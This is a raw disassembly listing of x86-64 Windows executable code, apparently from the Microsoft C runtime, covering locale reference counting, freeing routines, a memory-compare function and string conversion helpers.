   140006af4:	48 8d 15 1d 0c 01 00 	lea    0x10c1d(%rip),%rdx        # 0x140017718
   140006afb:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   140006aff:	74 0c                	je     0x140006b0d
   140006b01:	48 8b 10             	mov    (%rax),%rdx
   140006b04:	48 85 d2             	test   %rdx,%rdx
   140006b07:	74 04                	je     0x140006b0d
   140006b09:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140006b0d:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   140006b12:	74 0d                	je     0x140006b21
   140006b14:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   140006b18:	48 85 d2             	test   %rdx,%rdx
   140006b1b:	74 04                	je     0x140006b21
   140006b1d:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140006b21:	48 83 c0 20          	add    $0x20,%rax
   140006b25:	49 83 e8 01          	sub    $0x1,%r8
   140006b29:	75 c9                	jne    0x140006af4
   140006b2b:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   140006b32:	e8 a5 01 00 00       	call   0x140006cdc
   140006b37:	48 83 c4 28          	add    $0x28,%rsp
   140006b3b:	c3                   	ret
   140006b3c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006b41:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006b46:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006b4b:	57                   	push   %rdi
   140006b4c:	48 83 ec 20          	sub    $0x20,%rsp
   140006b50:	48 8b 81 f8 00 00 00 	mov    0xf8(%rcx),%rax
   140006b57:	48 8b d9             	mov    %rcx,%rbx
   140006b5a:	48 85 c0             	test   %rax,%rax
   140006b5d:	74 79                	je     0x140006bd8
   140006b5f:	48 8d 0d ca 0c 01 00 	lea    0x10cca(%rip),%rcx        # 0x140017830
   140006b66:	48 3b c1             	cmp    %rcx,%rax
   140006b69:	74 6d                	je     0x140006bd8
   140006b6b:	48 8b 83 e0 00 00 00 	mov    0xe0(%rbx),%rax
   140006b72:	48 85 c0             	test   %rax,%rax
   140006b75:	74 61                	je     0x140006bd8
   140006b77:	83 38 00             	cmpl   $0x0,(%rax)
   140006b7a:	75 5c                	jne    0x140006bd8
   140006b7c:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   140006b83:	48 85 c9             	test   %rcx,%rcx
   140006b86:	74 16                	je     0x140006b9e
   140006b88:	83 39 00             	cmpl   $0x0,(%rcx)
   140006b8b:	75 11                	jne    0x140006b9e
   140006b8d:	e8 42 ec ff ff       	call   0x1400057d4
   140006b92:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   140006b99:	e8 72 f8 ff ff       	call   0x140006410
   140006b9e:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   140006ba5:	48 85 c9             	test   %rcx,%rcx
   140006ba8:	74 16                	je     0x140006bc0
   140006baa:	83 39 00             	cmpl   $0x0,(%rcx)
   140006bad:	75 11                	jne    0x140006bc0
   140006baf:	e8 20 ec ff ff       	call   0x1400057d4
   140006bb4:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   140006bbb:	e8 5c f9 ff ff       	call   0x14000651c
   140006bc0:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   140006bc7:	e8 08 ec ff ff       	call   0x1400057d4
   140006bcc:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   140006bd3:	e8 fc eb ff ff       	call   0x1400057d4
   140006bd8:	48 8b 83 00 01 00 00 	mov    0x100(%rbx),%rax
   140006bdf:	48 85 c0             	test   %rax,%rax
   140006be2:	74 47                	je     0x140006c2b
   140006be4:	83 38 00             	cmpl   $0x0,(%rax)
   140006be7:	75 42                	jne    0x140006c2b
   140006be9:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   140006bf0:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   140006bf7:	e8 d8 eb ff ff       	call   0x1400057d4
   140006bfc:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   140006c03:	bf 80 00 00 00       	mov    $0x80,%edi
   140006c08:	48 2b cf             	sub    %rdi,%rcx
   140006c0b:	e8 c4 eb ff ff       	call   0x1400057d4
   140006c10:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   140006c17:	48 2b cf             	sub    %rdi,%rcx
   140006c1a:	e8 b5 eb ff ff       	call   0x1400057d4
   140006c1f:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   140006c26:	e8 a9 eb ff ff       	call   0x1400057d4
   140006c2b:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   140006c32:	e8 cd 00 00 00       	call   0x140006d04
   140006c37:	48 8d b3 28 01 00 00 	lea    0x128(%rbx),%rsi
   140006c3e:	bd 06 00 00 00       	mov    $0x6,%ebp
   140006c43:	48 8d 7b 38          	lea    0x38(%rbx),%rdi
   140006c47:	48 8d 05 ca 0a 01 00 	lea    0x10aca(%rip),%rax        # 0x140017718
   140006c4e:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   140006c52:	74 1a                	je     0x140006c6e
   140006c54:	48 8b 0f             	mov    (%rdi),%rcx
   140006c57:	48 85 c9             	test   %rcx,%rcx
   140006c5a:	74 12                	je     0x140006c6e
   140006c5c:	83 39 00             	cmpl   $0x0,(%rcx)
   140006c5f:	75 0d                	jne    0x140006c6e
   140006c61:	e8 6e eb ff ff       	call   0x1400057d4
   140006c66:	48 8b 0e             	mov    (%rsi),%rcx
   140006c69:	e8 66 eb ff ff       	call   0x1400057d4
   140006c6e:	48 83 7f e8 00       	cmpq   $0x0,-0x18(%rdi)
   140006c73:	74 13                	je     0x140006c88
   140006c75:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   140006c79:	48 85 c9             	test   %rcx,%rcx
   140006c7c:	74 0a                	je     0x140006c88
   140006c7e:	83 39 00             	cmpl   $0x0,(%rcx)
   140006c81:	75 05                	jne    0x140006c88
   140006c83:	e8 4c eb ff ff       	call   0x1400057d4
   140006c88:	48 83 c6 08          	add    $0x8,%rsi
   140006c8c:	48 83 c7 20          	add    $0x20,%rdi
   140006c90:	48 83 ed 01          	sub    $0x1,%rbp
   140006c94:	75 b1                	jne    0x140006c47
   140006c96:	48 8b cb             	mov    %rbx,%rcx
   140006c99:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006c9e:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140006ca3:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006ca8:	48 83 c4 20          	add    $0x20,%rsp
   140006cac:	5f                   	pop    %rdi
   140006cad:	e9 22 eb ff ff       	jmp    0x1400057d4
   140006cb2:	cc                   	int3
   140006cb3:	cc                   	int3
   140006cb4:	48 85 c9             	test   %rcx,%rcx
   140006cb7:	74 1c                	je     0x140006cd5
   140006cb9:	48 8d 05 a0 7e 00 00 	lea    0x7ea0(%rip),%rax        # 0x14000eb60
   140006cc0:	48 3b c8             	cmp    %rax,%rcx
   140006cc3:	74 10                	je     0x140006cd5
   140006cc5:	b8 01 00 00 00       	mov    $0x1,%eax
   140006cca:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   140006cd1:	00 
   140006cd2:	ff c0                	inc    %eax
   140006cd4:	c3                   	ret
   140006cd5:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   140006cda:	c3                   	ret
   140006cdb:	cc                   	int3
   140006cdc:	48 85 c9             	test   %rcx,%rcx
   140006cdf:	74 1a                	je     0x140006cfb
   140006ce1:	48 8d 05 78 7e 00 00 	lea    0x7e78(%rip),%rax        # 0x14000eb60
   140006ce8:	48 3b c8             	cmp    %rax,%rcx
   140006ceb:	74 0e                	je     0x140006cfb
   140006ced:	83 c8 ff             	or     $0xffffffff,%eax
   140006cf0:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   140006cf7:	00 
   140006cf8:	ff c8                	dec    %eax
   140006cfa:	c3                   	ret
   140006cfb:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   140006d00:	c3                   	ret
   140006d01:	cc                   	int3
   140006d02:	cc                   	int3
   140006d03:	cc                   	int3
   140006d04:	48 85 c9             	test   %rcx,%rcx
   140006d07:	74 30                	je     0x140006d39
   140006d09:	53                   	push   %rbx
   140006d0a:	48 83 ec 20          	sub    $0x20,%rsp
   140006d0e:	48 8d 05 4b 7e 00 00 	lea    0x7e4b(%rip),%rax        # 0x14000eb60
   140006d15:	48 8b d9             	mov    %rcx,%rbx
   140006d18:	48 3b c8             	cmp    %rax,%rcx
   140006d1b:	74 17                	je     0x140006d34
   140006d1d:	8b 81 5c 01 00 00    	mov    0x15c(%rcx),%eax
   140006d23:	85 c0                	test   %eax,%eax
   140006d25:	75 0d                	jne    0x140006d34
   140006d27:	e8 5c f8 ff ff       	call   0x140006588
   140006d2c:	48 8b cb             	mov    %rbx,%rcx
   140006d2f:	e8 a0 ea ff ff       	call   0x1400057d4
   140006d34:	48 83 c4 20          	add    $0x20,%rsp
   140006d38:	5b                   	pop    %rbx
   140006d39:	c3                   	ret
   140006d3a:	cc                   	int3
   140006d3b:	cc                   	int3
   140006d3c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006d41:	57                   	push   %rdi
   140006d42:	48 83 ec 20          	sub    $0x20,%rsp
   140006d46:	e8 55 d7 ff ff       	call   0x1400044a0
   140006d4b:	48 8d b8 90 00 00 00 	lea    0x90(%rax),%rdi
   140006d52:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   140006d58:	8b 05 72 0b 01 00    	mov    0x10b72(%rip),%eax        # 0x1400178d0
   140006d5e:	85 c8                	test   %ecx,%eax
   140006d60:	74 08                	je     0x140006d6a
   140006d62:	48 8b 1f             	mov    (%rdi),%rbx
   140006d65:	48 85 db             	test   %rbx,%rbx
   140006d68:	75 2c                	jne    0x140006d96
   140006d6a:	b9 04 00 00 00       	mov    $0x4,%ecx
   140006d6f:	e8 6c d6 ff ff       	call   0x1400043e0
   140006d74:	90                   	nop
   140006d75:	48 8b 15 cc 1d 01 00 	mov    0x11dcc(%rip),%rdx        # 0x140018b48
   140006d7c:	48 8b cf             	mov    %rdi,%rcx
   140006d7f:	e8 28 00 00 00       	call   0x140006dac
   140006d84:	48 8b d8             	mov    %rax,%rbx
   140006d87:	b9 04 00 00 00       	mov    $0x4,%ecx
   140006d8c:	e8 6b d6 ff ff       	call   0x1400043fc
   140006d91:	48 85 db             	test   %rbx,%rbx
   140006d94:	74 0e                	je     0x140006da4
   140006d96:	48 8b c3             	mov    %rbx,%rax
   140006d99:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006d9e:	48 83 c4 20          	add    $0x20,%rsp
   140006da2:	5f                   	pop    %rdi
   140006da3:	c3                   	ret
   140006da4:	e8 a3 cc ff ff       	call   0x140003a4c
   140006da9:	90                   	nop
   140006daa:	cc                   	int3
   140006dab:	cc                   	int3
   140006dac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006db1:	57                   	push   %rdi
   140006db2:	48 83 ec 20          	sub    $0x20,%rsp
   140006db6:	48 8b fa             	mov    %rdx,%rdi
   140006db9:	48 85 d2             	test   %rdx,%rdx
   140006dbc:	74 46                	je     0x140006e04
   140006dbe:	48 85 c9             	test   %rcx,%rcx
   140006dc1:	74 41                	je     0x140006e04
   140006dc3:	48 8b 19             	mov    (%rcx),%rbx
   140006dc6:	48 3b da             	cmp    %rdx,%rbx
   140006dc9:	75 05                	jne    0x140006dd0
   140006dcb:	48 8b c7             	mov    %rdi,%rax
   140006dce:	eb 36                	jmp    0x140006e06
   140006dd0:	48 89 39             	mov    %rdi,(%rcx)
   140006dd3:	48 8b cf             	mov    %rdi,%rcx
   140006dd6:	e8 2d fc ff ff       	call   0x140006a08
   140006ddb:	48 85 db             	test   %rbx,%rbx
   140006dde:	74 eb                	je     0x140006dcb
   140006de0:	48 8b cb             	mov    %rbx,%rcx
   140006de3:	e8 ac fc ff ff       	call   0x140006a94
   140006de8:	83 7b 10 00          	cmpl   $0x0,0x10(%rbx)
   140006dec:	75 dd                	jne    0x140006dcb
   140006dee:	48 8d 05 bb 07 01 00 	lea    0x107bb(%rip),%rax        # 0x1400175b0
   140006df5:	48 3b d8             	cmp    %rax,%rbx
   140006df8:	74 d1                	je     0x140006dcb
   140006dfa:	48 8b cb             	mov    %rbx,%rcx
   140006dfd:	e8 3a fd ff ff       	call   0x140006b3c
   140006e02:	eb c7                	jmp    0x140006dcb
   140006e04:	33 c0                	xor    %eax,%eax
   140006e06:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006e0b:	48 83 c4 20          	add    $0x20,%rsp
   140006e0f:	5f                   	pop    %rdi
   140006e10:	c3                   	ret
   140006e11:	cc                   	int3
   140006e12:	cc                   	int3
   140006e13:	cc                   	int3
   140006e14:	40 53                	rex push %rbx
   140006e16:	45 8b 18             	mov    (%r8),%r11d
   140006e19:	48 8b da             	mov    %rdx,%rbx
   140006e1c:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140006e20:	4c 8b c9             	mov    %rcx,%r9
   140006e23:	41 f6 00 04          	testb  $0x4,(%r8)
   140006e27:	4c 8b d1             	mov    %rcx,%r10
   140006e2a:	74 13                	je     0x140006e3f
   140006e2c:	41 8b 40 08          	mov    0x8(%r8),%eax
   140006e30:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140006e34:	f7 d8                	neg    %eax
   140006e36:	4c 03 d1             	add    %rcx,%r10
   140006e39:	48 63 c8             	movslq %eax,%rcx
   140006e3c:	4c 23 d1             	and    %rcx,%r10
   140006e3f:	49 63 c3             	movslq %r11d,%rax
   140006e42:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   140006e46:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140006e4a:	8b 48 08             	mov    0x8(%rax),%ecx
   140006e4d:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140006e51:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   140006e56:	74 0b                	je     0x140006e63
   140006e58:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   140006e5d:	83 e0 f0             	and    $0xfffffff0,%eax
   140006e60:	4c 03 c8             	add    %rax,%r9
   140006e63:	4c 33 ca             	xor    %rdx,%r9
   140006e66:	49 8b c9             	mov    %r9,%rcx
   140006e69:	5b                   	pop    %rbx
   140006e6a:	e9 b1 a4 ff ff       	jmp    0x140001320
   140006e6f:	cc                   	int3
   140006e70:	48 83 ec 28          	sub    $0x28,%rsp
   140006e74:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140006e78:	48 8b ca             	mov    %rdx,%rcx
   140006e7b:	49 8b d1             	mov    %r9,%rdx
   140006e7e:	e8 91 ff ff ff       	call   0x140006e14
   140006e83:	b8 01 00 00 00       	mov    $0x1,%eax
   140006e88:	48 83 c4 28          	add    $0x28,%rsp
   140006e8c:	c3                   	ret
   140006e8d:	cc                   	int3
   140006e8e:	cc                   	int3
   140006e8f:	cc                   	int3
   140006e90:	cc                   	int3
   140006e91:	cc                   	int3
   140006e92:	cc                   	int3
   140006e93:	cc                   	int3
   140006e94:	cc                   	int3
   140006e95:	cc                   	int3
   140006e96:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140006e9d:	00 00 00 
   140006ea0:	48 2b d1             	sub    %rcx,%rdx
   140006ea3:	49 83 f8 08          	cmp    $0x8,%r8
   140006ea7:	72 22                	jb     0x140006ecb
   140006ea9:	f6 c1 07             	test   $0x7,%cl
   140006eac:	74 14                	je     0x140006ec2
   140006eae:	66 90                	xchg   %ax,%ax
   140006eb0:	8a 01                	mov    (%rcx),%al
   140006eb2:	3a 04 11             	cmp    (%rcx,%rdx,1),%al
   140006eb5:	75 2c                	jne    0x140006ee3
   140006eb7:	48 ff c1             	inc    %rcx
   140006eba:	49 ff c8             	dec    %r8
   140006ebd:	f6 c1 07             	test   $0x7,%cl
   140006ec0:	75 ee                	jne    0x140006eb0
   140006ec2:	4d 8b c8             	mov    %r8,%r9
   140006ec5:	49 c1 e9 03          	shr    $0x3,%r9
   140006ec9:	75 1f                	jne    0x140006eea
   140006ecb:	4d 85 c0             	test   %r8,%r8
   140006ece:	74 0f                	je     0x140006edf
   140006ed0:	8a 01                	mov    (%rcx),%al
   140006ed2:	3a 04 11             	cmp    (%rcx,%rdx,1),%al
   140006ed5:	75 0c                	jne    0x140006ee3
   140006ed7:	48 ff c1             	inc    %rcx
   140006eda:	49 ff c8             	dec    %r8
   140006edd:	75 f1                	jne    0x140006ed0
   140006edf:	48 33 c0             	xor    %rax,%rax
   140006ee2:	c3                   	ret
   140006ee3:	1b c0                	sbb    %eax,%eax
   140006ee5:	83 d8 ff             	sbb    $0xffffffff,%eax
   140006ee8:	c3                   	ret
   140006ee9:	90                   	nop
   140006eea:	49 c1 e9 02          	shr    $0x2,%r9
   140006eee:	74 37                	je     0x140006f27
   140006ef0:	48 8b 01             	mov    (%rcx),%rax
   140006ef3:	48 3b 04 11          	cmp    (%rcx,%rdx,1),%rax
   140006ef7:	75 5b                	jne    0x140006f54
   140006ef9:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140006efd:	48 3b 44 11 08       	cmp    0x8(%rcx,%rdx,1),%rax
   140006f02:	75 4c                	jne    0x140006f50
   140006f04:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140006f08:	48 3b 44 11 10       	cmp    0x10(%rcx,%rdx,1),%rax
   140006f0d:	75 3d                	jne    0x140006f4c
   140006f0f:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140006f13:	48 3b 44 11 18       	cmp    0x18(%rcx,%rdx,1),%rax
   140006f18:	75 2e                	jne    0x140006f48
   140006f1a:	48 83 c1 20          	add    $0x20,%rcx
   140006f1e:	49 ff c9             	dec    %r9
   140006f21:	75 cd                	jne    0x140006ef0
   140006f23:	49 83 e0 1f          	and    $0x1f,%r8
   140006f27:	4d 8b c8             	mov    %r8,%r9
   140006f2a:	49 c1 e9 03          	shr    $0x3,%r9
   140006f2e:	74 9b                	je     0x140006ecb
   140006f30:	48 8b 01             	mov    (%rcx),%rax
   140006f33:	48 3b 04 11          	cmp    (%rcx,%rdx,1),%rax
   140006f37:	75 1b                	jne    0x140006f54
   140006f39:	48 83 c1 08          	add    $0x8,%rcx
   140006f3d:	49 ff c9             	dec    %r9
   140006f40:	75 ee                	jne    0x140006f30
   140006f42:	49 83 e0 07          	and    $0x7,%r8
   140006f46:	eb 83                	jmp    0x140006ecb
   140006f48:	48 83 c1 08          	add    $0x8,%rcx
   140006f4c:	48 83 c1 08          	add    $0x8,%rcx
   140006f50:	48 83 c1 08          	add    $0x8,%rcx
   140006f54:	48 8b 0c 0a          	mov    (%rdx,%rcx,1),%rcx
   140006f58:	48 0f c8             	bswap  %rax
   140006f5b:	48 0f c9             	bswap  %rcx
   140006f5e:	48 3b c1             	cmp    %rcx,%rax
   140006f61:	1b c0                	sbb    %eax,%eax
   140006f63:	83 d8 ff             	sbb    $0xffffffff,%eax
   140006f66:	c3                   	ret
   140006f67:	cc                   	int3
   140006f68:	e9 07 03 00 00       	jmp    0x140007274
   140006f6d:	cc                   	int3
   140006f6e:	cc                   	int3
   140006f6f:	cc                   	int3
   140006f70:	48 8b c4             	mov    %rsp,%rax
   140006f73:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140006f77:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140006f7b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140006f7f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140006f83:	41 56                	push   %r14
   140006f85:	48 83 ec 30          	sub    $0x30,%rsp
   140006f89:	33 db                	xor    %ebx,%ebx
   140006f8b:	41 8b e8             	mov    %r8d,%ebp
   140006f8e:	48 8b fa             	mov    %rdx,%rdi
   140006f91:	48 8b f1             	mov    %rcx,%rsi
   140006f94:	48 85 c9             	test   %rcx,%rcx
   140006f97:	75 22                	jne    0x140006fbb
   140006f99:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140006f9c:	74 0c                	je     0x140006faa
   140006f9e:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140006fa2:	e8 2d e8 ff ff       	call   0x1400057d4
   140006fa7:	88 5f 28             	mov    %bl,0x28(%rdi)
   140006faa:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   140006fae:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   140006fb2:	48 89 5f 20          	mov    %rbx,0x20(%rdi)
   140006fb6:	e9 0e 01 00 00       	jmp    0x1400070c9
   140006fbb:	38 19                	cmp    %bl,(%rcx)
   140006fbd:	75 55                	jne    0x140007014
   140006fbf:	48 39 5a 18          	cmp    %rbx,0x18(%rdx)
   140006fc3:	75 46                	jne    0x14000700b
   140006fc5:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140006fc8:	74 0c                	je     0x140006fd6
   140006fca:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140006fce:	e8 01 e8 ff ff       	call   0x1400057d4
   140006fd3:	88 5f 28             	mov    %bl,0x28(%rdi)
   140006fd6:	b9 02 00 00 00       	mov    $0x2,%ecx
   140006fdb:	e8 b0 f7 ff ff       	call   0x140006790
   140006fe0:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140006fe4:	48 8b cb             	mov    %rbx,%rcx
   140006fe7:	48 f7 d8             	neg    %rax
   140006fea:	1b d2                	sbb    %edx,%edx
   140006fec:	f7 d2                	not    %edx
   140006fee:	83 e2 0c             	and    $0xc,%edx
   140006ff1:	0f 94 c1             	sete   %cl
   140006ff4:	85 d2                	test   %edx,%edx
   140006ff6:	0f 94 c0             	sete   %al
   140006ff9:	88 47 28             	mov    %al,0x28(%rdi)
   140006ffc:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   140007000:	85 d2                	test   %edx,%edx
   140007002:	74 07                	je     0x14000700b
   140007004:	8b da                	mov    %edx,%ebx
   140007006:	e9 be 00 00 00       	jmp    0x1400070c9
   14000700b:	48 8b 47 10          	mov    0x10(%rdi),%rax
   14000700f:	66 89 18             	mov    %bx,(%rax)
   140007012:	eb 9e                	jmp    0x140006fb2
   140007014:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140007018:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000701c:	4c 8b c6             	mov    %rsi,%r8
   14000701f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140007024:	8b cd                	mov    %ebp,%ecx
   140007026:	41 8d 51 0a          	lea    0xa(%r9),%edx
   14000702a:	e8 7d f9 ff ff       	call   0x1400069ac
   14000702f:	4c 63 f0             	movslq %eax,%r14
   140007032:	85 c0                	test   %eax,%eax
   140007034:	75 16                	jne    0x14000704c
   140007036:	ff 15 cc e7 00 00    	call   *0xe7cc(%rip)        # 0x140015808
   14000703c:	8b c8                	mov    %eax,%ecx
   14000703e:	e8 f9 f2 ff ff       	call   0x14000633c
   140007043:	e8 b4 f2 ff ff       	call   0x1400062fc
   140007048:	8b 18                	mov    (%rax),%ebx
   14000704a:	eb 7d                	jmp    0x1400070c9
   14000704c:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   140007050:	4c 3b f1             	cmp    %rcx,%r14
   140007053:	76 43                	jbe    0x140007098
   140007055:	38 5f 28             	cmp    %bl,0x28(%rdi)
   140007058:	74 0c                	je     0x140007066
   14000705a:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   14000705e:	e8 71 e7 ff ff       	call   0x1400057d4
   140007063:	88 5f 28             	mov    %bl,0x28(%rdi)
   140007066:	4b 8d 0c 36          	lea    (%r14,%r14,1),%rcx
   14000706a:	e8 21 f7 ff ff       	call   0x140006790
   14000706f:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140007073:	48 8b cb             	mov    %rbx,%rcx
   140007076:	48 f7 d8             	neg    %rax
   140007079:	1b d2                	sbb    %edx,%edx
   14000707b:	f7 d2                	not    %edx
   14000707d:	83 e2 0c             	and    $0xc,%edx
   140007080:	49 0f 44 ce          	cmove  %r14,%rcx
   140007084:	85 d2                	test   %edx,%edx
   140007086:	0f 94 c0             	sete   %al
   140007089:	88 47 28             	mov    %al,0x28(%rdi)
   14000708c:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   140007090:	85 d2                	test   %edx,%edx
   140007092:	0f 85 6c ff ff ff    	jne    0x140007004
   140007098:	48 8b 47 10          	mov    0x10(%rdi),%rax
   14000709c:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400070a0:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   1400070a4:	4c 8b c6             	mov    %rsi,%r8
   1400070a7:	8b cd                	mov    %ebp,%ecx
   1400070a9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400070ae:	41 8d 51 0a          	lea    0xa(%r9),%edx
   1400070b2:	e8 f5 f8 ff ff       	call   0x1400069ac
   1400070b7:	48 63 c8             	movslq %eax,%rcx
   1400070ba:	85 c0                	test   %eax,%eax
   1400070bc:	0f 84 74 ff ff ff    	je     0x140007036
   1400070c2:	48 ff c9             	dec    %rcx
   1400070c5:	48 89 4f 20          	mov    %rcx,0x20(%rdi)
   1400070c9:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400070ce:	8b c3                	mov    %ebx,%eax
   1400070d0:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400070d5:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400070da:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400070df:	48 83 c4 30          	add    $0x30,%rsp
   1400070e3:	41 5e                	pop    %r14
   1400070e5:	c3                   	ret
   1400070e6:	cc                   	int3
   1400070e7:	cc                   	int3
   1400070e8:	48 8b c4             	mov    %rsp,%rax
   1400070eb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400070ef:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400070f3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400070f7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400070fb:	41 56                	push   %r14
   1400070fd:	48 83 ec 40          	sub    $0x40,%rsp
   140007101:	33 db                	xor    %ebx,%ebx
   140007103:	45 8b f0             	mov    %r8d,%r14d
   140007106:	48 8b fa             	mov    %rdx,%rdi
   140007109:	48 8b f1             	mov    %rcx,%rsi
   14000710c:	48 85 c9             	test   %rcx,%rcx
   14000710f:	75 22                	jne    0x140007133
   140007111:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140007114:	74 0c                	je     0x140007122
   140007116:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   14000711a:	e8 b5 e6 ff ff       	call   0x1400057d4
   14000711f:	88 5f 28             	mov    %bl,0x28(%rdi)
   140007122:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   140007126:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   14000712a:	48 89 5f 20          	mov    %rbx,0x20(%rdi)
   14000712e:	e9 22 01 00 00       	jmp    0x140007255
   140007133:	66 39 19             	cmp    %bx,(%rcx)
   140007136:	75 54                	jne    0x14000718c
   140007138:	48 39 5a 18          	cmp    %rbx,0x18(%rdx)
   14000713c:	75 46                	jne    0x140007184
   14000713e:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140007141:	74 0c                	je     0x14000714f
   140007143:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140007147:	e8 88 e6 ff ff       	call   0x1400057d4
   14000714c:	88 5f 28             	mov    %bl,0x28(%rdi)
   14000714f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140007154:	e8 37 f6 ff ff       	call   0x140006790
   140007159:	48 89 47 10          	mov    %rax,0x10(%rdi)
   14000715d:	48 8b cb             	mov    %rbx,%rcx
   140007160:	48 f7 d8             	neg    %rax
   140007163:	1b d2                	sbb    %edx,%edx
   140007165:	f7 d2                	not    %edx
   140007167:	83 e2 0c             	and    $0xc,%edx
   14000716a:	0f 94 c1             	sete   %cl
   14000716d:	85 d2                	test   %edx,%edx
   14000716f:	0f 94 c0             	sete   %al
   140007172:	88 47 28             	mov    %al,0x28(%rdi)
   140007175:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   140007179:	85 d2                	test   %edx,%edx
   14000717b:	74 07                	je     0x140007184
   14000717d:	8b da                	mov    %edx,%ebx
   14000717f:	e9 d1 00 00 00       	jmp    0x140007255
   140007184:	48 8b 47 10          	mov    0x10(%rdi),%rax
   140007188:	88 18                	mov    %bl,(%rax)
   14000718a:	eb 9e                	jmp    0x14000712a
   14000718c:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140007191:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140007195:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000719a:	4c 8b c6             	mov    %rsi,%r8
   14000719d:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400071a1:	33 d2                	xor    %edx,%edx
   1400071a3:	41 8b ce             	mov    %r14d,%ecx
   1400071a6:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400071ab:	e8 d4 0a 00 00       	call   0x140007c84
   1400071b0:	48 63 e8             	movslq %eax,%rbp
   1400071b3:	85 c0                	test   %eax,%eax
   1400071b5:	75 19                	jne    0x1400071d0
   1400071b7:	ff 15 4b e6 00 00    	call   *0xe64b(%rip)        # 0x140015808
   1400071bd:	8b c8                	mov    %eax,%ecx
   1400071bf:	e8 78 f1 ff ff       	call   0x14000633c
   1400071c4:	e8 33 f1 ff ff       	call   0x1400062fc
